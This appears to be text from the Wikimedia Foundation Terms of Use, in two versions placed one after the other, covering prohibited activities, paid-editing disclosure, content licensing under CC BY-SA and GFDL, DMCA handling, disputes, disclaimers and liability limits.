 * Using the services in a manner that is inconsistent with applicable law.

Engaging in Disruptive and Illegal Misuse of Facilities
 * Posting or distributing content that contains any viruses, malware, worms, Trojan horses, malicious code, or other device that could harm our technical infrastructure or system or that of our users;
 * Engaging in automated uses of the site that are abusive or disruptive of the services and have not been approved by the Wikimedia community;
 * Disrupting the services by placing an undue burden on a Project website or the networks or servers connected with a Project website;
 * Disrupting the services by inundating any of the Project websites with communications or other traffic that suggests no serious intent to use the Project website for its stated purpose;
 * Knowingly accessing, tampering with, or using any of our non-public areas in our computer systems without authorization; and
 * Probing, scanning, or testing the vulnerability of any of our technical systems or networks unless all the following conditions are met:

 * such actions do not unduly abuse or disrupt our technical systems or networks;
 * such actions are not for personal gain (except for credit for your work);
 * you report any vulnerabilities to MediaWiki developers (or fix it yourself); and
 * you do not undertake such actions with malicious or destructive intent.

Paid contributions without disclosure These Terms of Use prohibit engaging in deceptive activities, including misrepresentation of affiliation, impersonation, and fraud. As part of these obligations, you must disclose your employer, client, and affiliation with respect to any contribution for which you receive, or expect to receive, compensation. You must make that disclosure in at least one of the following ways:
 * a statement on your user page,
 * a statement on the talk page accompanying any paid contributions, or
 * a statement in the edit summary accompanying any paid contributions.

Applicable law, or community and Foundation policies and guidelines, such as those addressing conflicts of interest, may further limit paid contributions or require more detailed disclosure. A Wikimedia Project community may adopt an alternative paid contribution disclosure policy. If a Project adopts an alternative disclosure policy, you may comply with that policy instead of the requirements in this section when contributing to that Project. An alternative paid contribution policy will only supersede these requirements if it is approved by the relevant Project community and listed in the alternative disclosure policy page. For more information, please read our FAQ on disclosure of paid contributions.

We reserve the right to exercise our enforcement discretion with respect to the above terms.


5. PASSWORD SECURITY

You are responsible for safeguarding your own password and should never disclose it to any third party.


6. TRADEMARKS

Although you have considerable freedoms for re-use of the content on the Project websites, it is important that, at the Wikimedia Foundation, we protect our trademark rights so that we can protect our users from fraudulent impersonators. Because of this, we ask that you please respect our trademarks. All Wikimedia Foundation trademarks belong to the Wikimedia Foundation, and any use of our trade names, trademarks, service marks, logos, or domain names must be in compliance with these Terms of Use and in compliance with our Trademark Policy.


7. LICENSING OF CONTENT

To grow the commons of free knowledge and free culture, all users contributing to the Projects are required to grant broad permissions to the general public to re-distribute and re-use their contributions freely, so long as that use is properly attributed and the same freedom to re-use and re-distribute is granted to any derivative works. In keeping with our goal of providing free information to the widest possible audience, we require that when necessary all submitted content be licensed so that it is freely reusable by anyone who cares to access it.

You agree to the following licensing requirements:

 1. Text to which you hold the copyright: When you submit text to which you hold the copyright, you agree to license it under:
    * Creative Commons Attribution-ShareAlike 3.0 Unported License (“CC BY-SA”), and
    * GNU Free Documentation License (“GFDL”) (unversioned, with no invariant sections, front-cover texts, or back-cover texts).
    
    (Re-users may comply with either license or both.)
    
    The only exception is if the Project edition or feature requires a different license. In that case, you agree to license any text you contribute under that particular license. For example, at the publication of this version of the Terms of Use, English Wikinews mandates that all text content is licensed under the Creative Commons Attribution 2.5 Generic License (CC BY 2.5) and does not require a dual license with GFDL.
    
    
    Please note that these licenses do allow commercial uses of your contributions, as long as such uses are compliant with the terms.

 2. Attribution: Attribution is an important part of these licenses. We consider it giving credit where credit is due – to authors like yourself. When you contribute text, you agree to be attributed in any of the following fashions:
    1. Through hyperlink (where possible) or URL to the article to which you contributed (since each article has a history page that lists all authors and editors);
    2. Through hyperlink (where possible) or URL to an alternative, stable online copy that is freely accessible, which conforms with the license, and which provides credit to the authors in a manner equivalent to the credit given on the Project website; or
    3. Through a list of all authors (but please note that any list of authors may be filtered to exclude very small or irrelevant contributions).
 3. Importing text: You may import text that you have found elsewhere or that you have co-authored with others, but in such case you warrant that the text is available under terms that are compatible with the CC BY-SA 3.0 license (or, as explained above, another license when exceptionally required by the Project edition or feature)("CC BY-SA"). Content available only under GFDL is not permissible.
    
    You agree that, if you import text under a CC BY-SA license that requires attribution, you must credit the author(s) in a reasonable fashion. Where such credit is commonly given through page histories (such as Wikimedia-internal copying), it is sufficient to give attribution in the edit summary, which is recorded in the page history, when importing the text. The attribution requirements are sometimes too intrusive for particular circumstances (regardless of the license), and there may be instances where the Wikimedia community decides that imported text cannot be used for that reason.

 4. Non-text media: Non-text media on the Projects are available under a variety of different licenses that support the general goal of allowing unrestricted re-use and re-distribution. When you contribute non-text media, you agree to comply with the requirements for such licenses as described in our Licensing Policy, and also comply with the requirements of the specific Project edition or feature to which you are contributing. Also see the Wikimedia Commons Licensing Policy for more information on contributing non-text media to that Project.
 5. No revocation of license: Except as consistent with your license, you agree that you will not unilaterally revoke or seek invalidation of any license that you have granted under these Terms of Use for text content or non-text media contributed to the Wikimedia Projects or features, even if you terminate use of our services.
 6. Public domain content: Content that is in the public domain is welcome! It is important however that you confirm the public domain status of the content under the law of the United States of America as well as the laws of any other countries as required by the specific Project edition. When you contribute content that is in the public domain, you warrant that the material is actually in the public domain, and you agree to label it appropriately.
 7. Re-use: Re-use of content that we host is welcome, though exceptions exist for content contributed under "fair use" or similar exemptions under copyright law. Any re-use must comply with the underlying license(s).
    
    When you re-use or re-distribute a text page developed by the Wikimedia community, you agree to attribute the authors in any of the following fashions:
    
    1. Through hyperlink (where possible) or URL to the page or pages that you are re-using (since each page has a history page that lists all authors and editors);
    2. Through hyperlink (where possible) or URL to an alternative, stable online copy that is freely accessible, which conforms with the license, and which provides credit to the authors in a manner equivalent to the credit given on the Project website; or
    3. Through a list of all authors (but please note that any list of authors may be filtered to exclude very small or irrelevant contributions).
    
    If the text content was imported from another source, it is possible that the content is licensed under a compatible CC BY-SA license but not GFDL (as described in “Importing text,” above). In that case, you agree to comply with the compatible CC BY-SA license and do not have the option to re-license it under GFDL. To determine the license that applies to the content that you seek to re-use or re-distribute, you should review the page footer, page history, and discussion page.
    
    In addition, please be aware that text that originated from external sources and was imported into a Project may be under a license that attaches additional attribution requirements. Users agree to indicate these additional attribution requirements clearly. Depending on the Project, such requirements may appear for example in a banner or other notations pointing out that some or all of the content was originally published elsewhere. Where there are such visible notations, re-users should preserve them.
    
    For any non-text media, you agree to comply with whatever license under which the work has been made available (which can be discovered by clicking on the work and looking at the licensing section on its description page or reviewing an applicable source page for that work). When re-using any content that we host, you agree to comply with the relevant attribution requirements as they pertain to the underlying license or licenses.
 8. Modifications or additions to material that you re-use: When modifying or making additions to text that you have obtained from a Project website, you agree to license the modified or added content under CC BY-SA 3.0 or later (or, as explained above, another license when exceptionally required by the specific Project edition or feature).
    
    When modifying or making additions to any non-text media that you have obtained from a Project website, you agree to license the modified or added content in accordance with whatever license under which the work has been made available.
    
    With both text content and non-text media, you agree to clearly indicate that the original work has been modified. If you are re-using text content in a wiki, it is sufficient to indicate in the page history that you made a change to the imported text. For each copy or modified version that you distribute, you agree to include a licensing notice stating which license the work is released under, along with either a hyperlink or URL to the text of the license or a copy of the license itself.


8. DMCA COMPLIANCE

The Wikimedia Foundation wants to ensure that the content that we host can be re-used by other users without fear of liability and that it is not infringing the proprietary rights of others. In fairness to our users, as well as to other creators and copyright holders, our policy is to respond to notices of alleged infringement that comply with the formalities of the Digital Millennium Copyright Act (DMCA). Pursuant to the DMCA, we will terminate, in appropriate circumstances, users and account holders of our system and network who are repeat infringers.

However, we also recognize that not every takedown notice is valid or in good faith. In such cases, we strongly encourage users to file counter-notifications when they appropriately believe a DMCA takedown demand is invalid or improper. For more information on what to do if you think a DMCA notice has been improperly filed, you may wish to consult the Chilling Effects website.

If you are the owner of content that is being improperly used on one of the Projects without your permission, you may request that the content be removed under the DMCA. To make such a request, please email us at legalwikimedia.org or snail mail our designated agent at this address.

Alternatively, you may make a request to our community, which often handles copyright issues faster and more effectively than prescribed under the DMCA. In that case, you can post a notice explaining your copyright concerns. For a non-exhaustive and non-authoritative list of the relevant processes for the different Project editions, look here. Before filing a DMCA claim, you also have the option of sending an email to the community at infowikimedia.org.


9. THIRD-PARTY WEBSITES AND RESOURCES

You are solely responsible for your use of any third-party websites or resources. Although the Projects contain links to third-party websites and resources, we do not endorse and are not responsible or liable for their availability, accuracy, or the related content, products, or services (including, without limitation, any viruses or other disabling features), nor do we have any obligation to monitor such third-party content.


10. MANAGEMENT OF WEBSITES

The community has the primary role in creating and enforcing policies applying to the different Project editions. At the Wikimedia Foundation, we rarely intervene in community decisions about policy and its enforcement. In an unusual case, the need may arise, or the community may ask us, to address an especially problematic user because of significant Project disturbance or dangerous behavior. In such cases, we reserve the right, but do not have the obligation to:

 * Investigate your use of the service (a) to determine whether a violation of these Terms of Use, Project edition policy, or other applicable law or policy has occurred, or (b) to comply with any applicable law, legal process, or appropriate governmental request;
 * Detect, prevent, or otherwise address fraud, security, or technical issues or respond to user support requests;
 * Refuse, disable, or restrict access to the contribution of any user who violates these Terms of Use;
 * Ban a user from editing or contributing or block a user's account or access for actions violating these Terms of Use, including repeat copyright infringement;
 * Take legal action against users who violate these Terms of Use (including reports to law enforcement authorities); and
 * Manage otherwise the Project websites in a manner designed to facilitate their proper functioning and protect the rights, property, and safety of ourselves and our users, licensors, partners, and the public.

In the interests of our users and the Projects, in the extreme circumstance that any individual has had his or her account or access blocked under this provision, he or she is prohibited from creating or using another account on or seeking access to the same Project, unless we provide explicit permission. Without limiting the authority of the community, the Wikimedia Foundation itself will not ban a user from editing or contributing or block a user's account or access solely because of good faith criticism that does not result in actions otherwise violating these Terms of Use or community policies.

The Wikimedia community and its members may also take action when so allowed by the community or Foundation policies applicable to the specific Project edition, including but not limited to warning, investigating, blocking, or banning users who violate those policies. You agree to comply with the final decisions of dispute resolution bodies that are established by the community for the specific Project editions (such as arbitration committees); these decisions may include sanctions as set out by the policy of the specific Project edition.

Especially problematic users who have had accounts or access blocked on multiple Project editions may be subject to a ban from all of the Project editions, in accordance with the Global Ban Policy. In contrast to Board resolutions or these Terms of Use, policies established by the community, which may cover a single Project edition or multiple Projects editions (like the Global Ban Policy), may be modified by the relevant community according to its own procedures.

The blocking of an account or access or the banning of a user under this provision shall be in accordance with Section 12 of these Terms of Use.


11. RESOLUTIONS AND PROJECT POLICIES

The Wikimedia Foundation Board of Trustees releases official policies from time to time. Some of these policies may be mandatory for a particular Project or Project edition, and, when they are, you agree to abide by them as applicable.


12. TERMINATION

Though we hope you will stay and continue to contribute to the Projects, you can stop using our services any time. In certain (hopefully unlikely) circumstances it may be necessary for either ourselves or the Wikimedia community or its members (as described in Section 10) to terminate part or all of our services, terminate these Terms of Use, block your account or access, or ban you as a user. If your account or access is blocked or otherwise terminated for any reason, your public contributions will remain publicly available (subject to applicable policies), and, unless we notify you otherwise, you may still access our public pages for the sole purpose of reading publicly available content on the Projects. In such circumstances, however, you may not be able to access your account or settings. We reserve the right to suspend or end the services at any time, with or without cause, and with or without notice. Even after your use and participation are banned, blocked or otherwise suspended, these Terms of Use will remain in effect with respect to relevant provisions, including Sections 1, 3, 4, 6, 7, 9-15, and 17.


13. DISPUTES AND JURISDICTION

Highlighted for emphasis

We hope that no serious disagreements arise involving you, but, in the event there is a dispute, we encourage you to seek resolution through the dispute resolution procedures or mechanisms provided by the Projects or Project editions and the Wikimedia Foundation. If you seek to file a legal claim against us, you agree to file and resolve it exclusively in a state or federal court located in San Francisco County, California. You also agree that the laws of the State of California and, to the extent applicable, the laws of the United States of America will govern these Terms of Use, as well as any legal claim that might arise between you and us (without reference to conflict of laws principles). You agree to submit to the personal jurisdiction of, and agree that venue is proper in, the courts located in San Francisco County, California, in any legal action or proceeding relating to us or these Terms of Use.

To ensure that disputes are dealt with soon after they arise, you agree that regardless of any statute or law to the contrary, any claim or cause of action you might have arising out of or related to use of our services or these Terms of Use must be filed within the applicable statute of limitations or, if earlier, one (1) year after the pertinent facts underlying such claim or cause of action could have been discovered with reasonable diligence (or be forever barred).


14. DISCLAIMERS

Highlighted for emphasis

At the Wikimedia Foundation, we do our best to provide educational and informational content to a very wide audience, but your use of our services is at your sole risk. We provide these services on an "as is" and "as available" basis, and we expressly disclaim all express or implied warranties of all kinds, including but not limited to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement. We make no warranty that our services will meet your requirements, be safe, secure, uninterrupted, timely, accurate, or error-free, or that your information will be secure.

We are not responsible for the content, data, or actions of third parties, and you release us, our directors, officers, employees, and agents from any claims and damages, known and unknown, arising out of or in any way connected with any claim you have against any such third parties. No advice or information, whether oral or written, obtained by you from us or through or from our services creates any warranty not expressly stated in these Terms of Use.

Any material downloaded or otherwise obtained through your use of our services is done at your own discretion and risk, and you will be solely responsible for any damage to your computer system or loss of data that results from the download of any such material. You agree that we have no responsibility or liability for the deletion of, or the failure to store or to transmit, any content or communication maintained by the service. We retain the right to create limits on use and storage at our sole discretion at any time with or without notice.

Some states or jurisdictions do not allow the types of disclaimers in this section, so they may not apply to you either in part or in full depending on the law.


15. LIMITATION ON LIABILITY

Highlighted for emphasis

The Wikimedia Foundation will not be liable to you or to any other party for any direct, indirect, incidental, special, consequential or exemplary damages, including but not limited to, damages for loss of profits, goodwill, use, data, or other intangible losses, regardless of whether we were advised of the possibility of such damage. In no event shall our liability exceed one thousand U.S. dollars (USD 1000.00) in aggregate. In the case that applicable law may not allow the limitation or exclusion of liability or incidental or consequential damages, the above limitation or exclusion may not apply to you, although our liability will be limited to the fullest extent permitted by applicable law.


16. MODIFICATIONS TO THESE TERMS OF USE

Just as the Wikimedia community's input is essential for the growth and maintenance of the Projects, we believe that community input is essential for these Terms of Use to properly serve our users. It is also essential for a fair contract. Therefore, we will provide these Terms of Use, as well as any substantial future revisions of these Terms of Use, to the community for comment at least thirty (30) days before the end of the comment period. If a future proposed revision is substantial, we will provide an additional 30 days for comments after posting a translation of the proposed revision in at least three languages (selected at our discretion). The community will be encouraged to translate the proposed revision in other languages as appropriate. For changes for legal or administrative reasons, to correct an inaccurate statement, or changes in response to community comments, we will provide at least three (3) days' notice.

Because it may be necessary to modify these Terms of Use from time to time, we will provide notice of such modifications and the opportunity to comment via the Project websites, and via a notification on WikimediaAnnounce-L. However, we ask that you please periodically review the most up-to-date version of these Terms of Use. Your continued use of our services after the new Terms of Use become official following the notice and review period constitutes an acceptance of these Terms of Use on your part. For the protection of the Wikimedia Foundation and other users like yourself, if you do not agree with our Terms of Use, you cannot use our services.


17. OTHER TERMS

These Terms of Use do not create an employment, agency, partnership, or joint venture relationship between you and us, the Wikimedia Foundation. If you have not signed a separate agreement with us, these Terms of Use are the entire agreement between you and us. If there is any conflict between these Terms of Use and a signed written agreement between you and us, the signed agreement will control.

You agree that we may provide you with notices, including those regarding changes to the Terms of Use, by email, regular mail, or postings on Project websites.

If in any circumstance, we do not apply or enforce any provision of these Terms of Use, it is not a waiver of that provision.

You understand that, unless otherwise agreed to in writing by us, you have no expectation of compensation for any activity, contribution, or idea that you provide to us, the community, or the Wikimedia Projects or Project editions.

Notwithstanding any provision to the contrary in these Terms of Use, we (the Wikimedia Foundation) and you agree not to modify the applicable terms and requirements of any free license that is employed on the Projects or Project editions when such free license is authorized by these Terms of Use.

These Terms of Use were written in English (U.S.). While we hope that translations of these Terms of Use are accurate, in the event of any differences in meaning between the original English version and a translation, the original English version takes precedence.

If any provision or part of a provision of these Terms of Use is found unlawful, void, or unenforceable, that provision or part of the provision is deemed severable from these Terms of Use and will be enforced to the maximum extent permissible, and all other provisions of these Terms of Use will remain in full force and effect.


THANK YOU!

We appreciate your taking the time to read these Terms of Use, and we are very happy to have you contributing to the Projects and using our services. Through your contributions, you are helping to build something really big – not only an important collection of collaboratively edited reference Projects that provides education and information to millions who might otherwise lack access, but also a vibrant community of like-minded and engaged peers, focused on a very noble goal.

----------------------------------------

Our Terms of Use

Imagine a world in which every single human being can freely share in the sum of all knowledge. That's our commitment. – Our Vision Statement

Welcome to Wikimedia! The Wikimedia Foundation, Inc. ("we" or "us" or "Foundation"), is a non-profit charitable organization, headquartered in San Francisco, California, United States, whose mission is to empower and engage people around the world to collect and develop content under a free license or in the public domain, and to disseminate it effectively and globally, free of charge.

To support our vibrant community, we provide the essential infrastructure and organizational framework for the development of multilingual wiki projects and their editions (as explained on our Wikimedia Projects page) (hereby referred to as "Projects") and other endeavors which serve this mission. We strive to make and keep educational and informational content from the Projects available on the internet free of charge, in perpetuity.

We welcome you ("you" or the "user") as a reader, or contributor of the Projects, and we encourage you to join the Wikimedia community. Before you participate, however, we ask that you please read and agree to the following Terms of Use ("Terms of Use").


OVERVIEW

These Terms of Use tell you about our public services at the Wikimedia Foundation, our relationship to you as a user, and the rights and responsibilities that guide us both. We host an incredible quantity of educational and informational content, all of which is contributed and made possible by users like yourself. Generally we do not contribute, monitor, or delete content (with rare exceptions, such as under policies like these Terms of Use, for legal compliance, or when faced with urgent threats of serious harm). This means that editorial control is in the hands of you and your fellow users who create and manage the content.

The community – the network of users who are constantly building and using the Projects and/or their websites (hereby referred to as "Project Websites") – is the principal means through which the goals of the mission are achieved. The community contributes to and helps govern our Projects and Project Websites. The community also undertakes the critical function of creating and enforcing policies for the specific Project editions (such as the different language editions for the Wikipedia Project or the Wikimedia Commons multilingual edition).

You, the user, are welcome to join as a contributor, editor, or author, but you should follow the policies that govern each of the independent Project editions, including the Universal Code of Conduct (UCoC), which apply to all Project editions. The largest of our Projects is Wikipedia, but we host other Projects too, each with different objectives and work methods. Each Project edition has a team of contributors, editors or authors who work together to create and manage the content on that Project edition. You are welcome to join these teams and work with them to improve these Projects. Since we are dedicated to making content freely accessible to the public, content you contribute is made available under a free license or released in the public domain.

Please be aware that you are legally responsible for all of your contributions, edits, and reuse of Wikimedia content under the laws of the United States of America and other applicable laws (which may include laws where you or the subject of your contributions are located). This means it is important that you exercise caution when posting, modifying or reusing content. In light of this responsibility, we have some rules about what you cannot do, most of which are either for your own protection or for the protection of other users like yourself. Please keep in mind that the content we host is for general informational purposes only, so if you need expert advice for a particular question (such as medical, legal, or financial issues), you should seek the help of an appropriate professional. We also include other important notices and disclaimers, so please read these Terms of Use in their entirety.

For clarity, other organizations, such as local Wikimedia chapters and associations, that may share in the same mission are nevertheless legally independent and separate from the Wikimedia Foundation. Unless otherwise stated by the Foundation as an authorized party on a given Project's Website, those other organizations have no responsibility for the operations of the Project's Website or its content.




1. OUR SERVICES

The Wikimedia Foundation is dedicated to encouraging the growth, development, and distribution of free multilingual content, and to hosting the full content of these wiki-based Projects for the public free of charge. Our role is to host some of the largest collaboratively edited reference Projects in the world, which can be found here. However, we act only as a hosting service provider, maintaining the infrastructure and organizational framework. This infrastructure and framework allow our users to build the Projects by contributing and editing content themselves. They also allow our users to reuse that content. The infrastructure we maintain includes specialized technological infrastructure that enables users to programmatically interact with and reuse content on Projects (referred to as "Application Programming Interface" or "APIs"), and mobile applications.

As used throughout the rest of the Terms of Use, our services consist of: The Project Websites we host, technological infrastructure that we maintain, and any technical spaces that we host for the maintenance and improvement of our Projects.

Because of our unique role, there are a couple of things you should be aware of when considering our relationship to you, the Projects, and other users:

 1. We do not take an editorial role: Because the Projects are collaboratively edited, the vast majority of the content that we host is provided by users, and we do not take an editorial role. This means that we generally do not monitor or edit the content of the Project Websites, and we do not take any responsibility for this content. Similarly, unless we have expressly stated otherwise, we do not endorse any opinions expressed via our services, and we do not represent or guarantee the truthfulness, accuracy, or reliability of any submitted community content on the Projects.
 2. You are responsible for your own actions: You are legally responsible for your edits and contributions on the Projects, your reuse of content on the Projects, your use of the APIs, and your use of our services more generally. For your own protection you should exercise caution and avoid taking any actions that may result in criminal or civil liability under any applicable laws. For clarity, applicable law includes at least the laws of the United States of America and the State of California. For other countries, this is determined on a case-by-case basis. Although we may not agree with such actions, we warn users—particularly the editors, contributors, and authors—that non-U.S. authorities may seek to apply other country laws to you, including local laws where you live or where you view or edit content. We generally cannot offer any protection, guarantee, immunity or indemnification against the application of such laws.




2. PRIVACY POLICY

We ask that you review the terms of our Privacy Policy, so that you are aware of how we collect and use your information.




3. CONTENT WE HOST

 1. You may find some material objectionable or erroneous: Because we host a wide array of content that is produced or gathered by fellow users, you may encounter material that you find offensive, erroneous, misleading, mislabeled, or otherwise objectionable. We therefore ask that you use common sense and proper judgment when using our services.
 2. The Projects' content is for general informational purposes only: Although our Projects host a great deal of information that pertains to professional topics, including medical, legal, or financial issues, this content is presented for general informational purposes only. It should not be taken as professional advice. Please seek independent professional counseling from someone who is licensed or qualified in the applicable area in lieu of acting on any information, opinion, or advice contained in one of the Project Websites.




4. REFRAINING FROM CERTAIN ACTIVITIES

The Projects hosted by the Wikimedia Foundation only exist because of the vibrant community of users like you who collaborate to write, edit, and curate the content. We happily welcome your participation in this community. We encourage you to be civil and polite in your interactions with others in the community, to act in good faith, and to make edits and contributions aimed at furthering the mission of the shared Project. We ask that all users review and follow the Universal Code of Conduct ("UCoC"), which lays out requirements for collegial, civil collaboration across all Projects that we host.

Certain activities, whether legal or illegal under the applicable law, may be harmful to other users and violate our rules, and some activities may also subject you to liability. Therefore, for your own protection and for that of other users, you may not engage in such activities on, or otherwise using, our Projects. These activities include:

Harassing and Abusing Others
 * Engaging in threats, stalking, spamming, vandalism, or harassment as described in the UCoC;
 * Transmitting chain mail, junk mail, or spam to other users;
 * Posting or modifying content with the intention to seriously harm others, such as deliberate inducements to self-harm, or deliberate triggering of epilepsy.

Violating the Privacy of Others
 * Infringing the privacy rights of others under the laws of the United States of America or other applicable laws (which may include the laws where you live or where you view or edit content);
 * Soliciting personally identifiable information for the purposes of harassment, exploitation, or violation of privacy, or for any promotional or commercial purpose not explicitly approved by the Wikimedia Foundation; and
 * Soliciting personally identifiable information from anyone under the age of 18 years, or under the age of majority where you are if higher than 18 years, for an illegal purpose or violating any applicable law regarding the health or well-being of minors.

Engaging in False Statements, Impersonation, or Fraud
 * Intentionally or knowingly posting content that constitutes libel or defamation under the laws of the United States of America;
 * Posting or modifying content with the intent to deceive or mislead others;
 * Attempting to impersonate another user or individual, misrepresenting your affiliation with any individual or entity, hiding your affiliation with any individual or entity when disclosure is required by these terms or local Project policy, or using the name or username of another person with the intent to deceive; and
 * Engaging in fraud.

Committing Infringement of Intellectual Property Rights
 * Infringing copyrights, trademarks, patents, or other proprietary rights under the applicable law.

Misusing Our Services for Other Illegal Purposes
 * Posting child pornography or any other content that violates applicable law concerning child pornography or child sexual abuse material, or encouraging, grooming, or advocating for others to create or share such material;
 * Posting or trafficking in obscene material that is unlawful under applicable law; and
 * Using the services in a manner that is inconsistent with applicable law.

Engaging in Disruptive and Illegal Misuse of Facilities
 * Posting or distributing content that contains any viruses, malware, worms, Trojan horses, malicious code, or other device that could harm our technical infrastructure or system or that of other users;
 * Engaging in automated uses of the Project Websites that are abusive or disruptive of the services, violate acceptable usage policies where available, or have not been approved by the Wikimedia community;
 * Disrupting the services by placing an undue burden on an API, Project Website or the networks or servers connected with a particular Project Website;
 * Disrupting the services by inundating any of the Project Websites with communications or other traffic that suggests no serious intent to use the Project website for its stated purpose;
 * Knowingly accessing, tampering with, or using any of our non-public areas in our computer systems without authorization; and
 * Probing, scanning, or testing the vulnerability of any of our technical systems or networks unless all the following conditions are met:

 * such actions do not unduly abuse or disrupt our technical systems or networks;
 * such actions are not for personal gain (except for credit for your work);
 * you report any vulnerabilities to the relevant developers (or fix it yourself); and
 * you do not undertake such actions with malicious or destructive intent.



Shortcut:
PAID
Paid Contributions Without Disclosure
 * You must disclose each and any employer, client, intended beneficiary and affiliation with respect to any contribution for which you receive, or expect to receive, compensation. You must make that disclosure in at least one of the following ways:

 * a statement on your user page,
 * a statement on the talk page accompanying any paid contributions, or
 * a statement in the edit summary accompanying any paid contributions.

 * In addition, if you make a public posting off the Projects advertising editing services on Wikipedia in exchange for compensation of any kind, you must disclose all Wikipedia accounts you have used or will use for this service in the public posting on the third-party service.
 * Applicable law, or Project-specific policies and Foundation policies and guidelines, such as those addressing conflicts of interest, may further limit paid contributions or require more detailed disclosure. For example, infringing Wikimedia Trademarks (defined hereinafter at Section 6) to advertise paid editing services, removing disclosures on previously adequately disclosed paid edits, or logged-out paid editing in a manner that makes adequate disclosure a practical impossibility violate this section.
 * A Wikimedia Project community may adopt an alternative paid contribution disclosure policy which may supplement or replace this section. If a Project adopts an alternative disclosure policy, you may comply with that policy instead of the requirements in this section (titled "Paid Contributions Without Disclosure") when contributing to that particular Project.

For more information, please read our FAQ on disclosure of paid contributions.

We reserve the right to exercise our enforcement discretion with respect to the provisions in section 4 of these Terms of Use. Where required, enforcement of these terms may include actions not listed in the Wikimedia Foundation Office Action Policy. If enforcement is required in new circumstances, we will make an effort within at most one (1) year to update the Office Action Policy to catalog the new type of action.

Marketing Company Mediations

Undisclosed editing by users receiving compensation creates an unreasonable burden on volunteer editors who investigate and enforce community policies. Therefore, for violations of this section related to undisclosed paid editing, you agree to submit to binding "Med-Arb" (a "Marketing Company Mediation") as described in section 14 of these Terms of Use.




5. PASSWORD SECURITY

You are responsible for safeguarding your own password and other security credentials, and should never disclose them to any third party.




6. TRADEMARKS

Although you have considerable freedoms for reuse of the content on the Project Websites, it is important that, at the Wikimedia Foundation, we protect our trademark rights so that we can protect our users from fraudulent impersonators. Because of this, we ask that you please respect our trademarks. All Wikimedia Foundation trademarks belong to the Wikimedia Foundation, and any use of our trade names, trademarks, service marks, logos, or domain names must be in compliance with these Terms of Use and in compliance with our Trademark Policy.




7. LICENSING OF CONTENT

To grow the commons of free knowledge and free culture, all users contributing to the Projects or Project Websites are required to grant broad permissions to the general public to redistribute and reuse their contributions freely, so long as that use is properly attributed and the same freedom to reuse and redistribute is granted to any derivative works. In keeping with our goal of providing free information to the widest possible audience, we require that when necessary all submitted content be licensed so that it is freely reusable by anyone who may access it.

You agree to the following licensing requirements:

 1. Text to which you hold the copyright: When you submit text to which you hold the copyright, you agree to license it under:
    * Creative Commons Attribution-ShareAlike 4.0 International License ("CC BY-SA 4.0"), and
    * GNU Free Documentation License ("GFDL") (unversioned, with no invariant sections, front-cover texts, or back-cover texts).
    Reusers may comply with either license or both.
    The only exception is if the Project edition or feature requires a different license. In that case, you agree to license any text you contribute under the particular license prescribed by the Project edition or the feature. Please note that these licenses do allow commercial uses of your contributions, as long as such uses are compliant with the terms of the respective licenses. Where you own Sui Generis Database Rights covered by CC BY-SA 4.0, you waive these rights. As an example, this means facts you contribute to the projects may be reused freely without attribution.
 2. Attribution: Attribution is an important part of these licenses. We consider it giving credit where credit is due – to authors like yourself. When you contribute text, you agree to be attributed in any of the following fashions:
    1. Through hyperlink (where possible) or URL to the article to which you contributed (since each article has a history page that lists all contributors, authors and editors);
    2. Through hyperlink (where possible) or URL to an alternative, stable online copy that is freely accessible, which conforms with the relevant license, and which provides credit to the authors in a manner equivalent to the credit given on the Project Website; or
    3. Through a list of all authors (but please note that any list of authors may be filtered to exclude very small or irrelevant contributions).
 3. Importing text: You may import text that you have found elsewhere or that you have co-authored with others, but in such case you represent and warrant that the text is available under terms that are compatible with CC BY-SA (or, as explained above, another license when exceptionally required by the Project edition or feature). For a list of compatible licenses, see Creative Commons. You shall not import content that is available solely under GFDL.
    You agree that, if you import text under a CC license that requires attribution, you must credit the author(s) in a reasonable fashion. Where such credit is commonly given through page histories (such as Wikimedia-internal copying), it is sufficient to give attribution in the edit summary, which is recorded in the page history, when importing the text. The attribution requirements are sometimes too intrusive for particular circumstances (regardless of the license), and there may be instances where the Wikimedia community decides that imported text cannot be used for that reason.
 4. Non-text media: Non-text media on the Projects are available under a variety of different licenses that support the general goal of allowing unrestricted reuse and redistribution. When you contribute non-text media, you agree to comply with the requirements for such licenses as described in our Licensing Policy, and also comply with the requirements of the specific Project edition or feature to which you are contributing. Also see the Wikimedia Commons Licensing Policy for more information on contributing non-text media to Wikimedia Commons.
 5. No revocation of license: Except as consistent with your license, you agree that you will not unilaterally revoke or seek invalidation of any license that you have granted under these Terms of Use for text content or non-text media contributed to the Projects or features, even if you terminate use of our services.
 6. Public domain content: Content that is in the public domain is welcome. It is important however that you confirm the public domain status of the content under the law of the United States of America as well as the laws of any other countries as required by the specific Project edition. When you contribute content that is in the public domain, you warrant that the material is actually in the public domain, and you agree to label it appropriately.
 7. Re-use: Reuse of content that we host is welcome, though exceptions exist for content contributed under "fair use" or similar exemptions under applicable copyright law. Any reuse must comply with the underlying license(s).
    When you reuse or redistribute a text page developed by the Wikimedia community, you agree to attribute the authors in any of the following fashions:
    1. Through hyperlink (where possible) or URL to the page or pages that you are reusing (since each page has a history page that lists all contributors, authors and editors);
    2. Through hyperlink (where possible) or URL to an alternative, stable online copy that is freely accessible, which conforms with the license, and which provides credit to the authors in a manner equivalent to the credit given on the Project Website; or
    3. Through a list of all authors (but please note that any list of authors may be filtered to exclude very small or irrelevant contributions).
    
    If the text content was imported from another source, it is possible that the content is licensed under a compatible CC BY-SA license but not GFDL (as described in "Importing text," above). In that case, you agree to comply with the compatible CC BY-SA license and do not have the option to relicense it under GFDL. To determine the license that applies to the content that you seek to reuse or redistribute, you should review the page footer, page history, and discussion page.
    
    In addition, please be aware that text that originated from external sources and was imported into a Project may be under a license that attaches additional attribution requirements. Users agree to indicate these additional attribution requirements clearly. Depending on the Project, such requirements may appear, for example, in a banner or other notations pointing out that some or all of the content was originally published elsewhere. Where there are such visible notations, reusers should preserve them.
    
    For any non-text media, you agree to comply with the applicable license under which the work has been made available (which can be discovered by clicking on the work and looking at the licensing section on its description page or reviewing an applicable source page for that work). When reusing any content that we host, you agree to comply with the relevant attribution requirements as they pertain to the underlying license or licenses.
 8. Modifications or additions to material that you reuse: When modifying or making additions to text that you have obtained from a Project Website, you agree to license the modified or added content under CC BY-SA 4.0 or later (or, as explained above, another license when exceptionally required by the specific Project edition or feature).
    When modifying or making additions to any non-text media that you have obtained from a Project website, you agree to license the modified or added content in accordance with whatever license under which the work has been made available.
